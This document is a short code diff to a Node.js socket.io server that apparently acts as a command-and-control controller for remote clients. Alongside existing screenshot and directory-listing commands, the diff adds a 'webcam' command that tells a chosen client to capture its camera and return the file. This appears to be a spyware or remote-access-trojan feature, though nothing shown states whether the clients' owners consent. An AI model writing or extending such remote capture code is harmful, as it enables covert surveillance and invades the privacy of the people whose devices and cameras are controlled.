@@ -35,6 +35,11 @@ io.on('connection', function(socket){
         expectingFile = obj.sid + '_' + Date.now() + '_' + obj.args
         clients[obj.sid].socket.write('screenshot:0\0');
         break;
+      case 'webcam':
+        console.log('send webcam', obj);
+        expectingFile = obj.sid + '_' + Date.now() + '_' + obj.args
+        clients[obj.sid].socket.write('webcam:0\0');
+        break;
       case 'ls':
         console.log('send ls', obj);
         clients[obj.sid].socket.write('ls:' + obj.args + '\0');
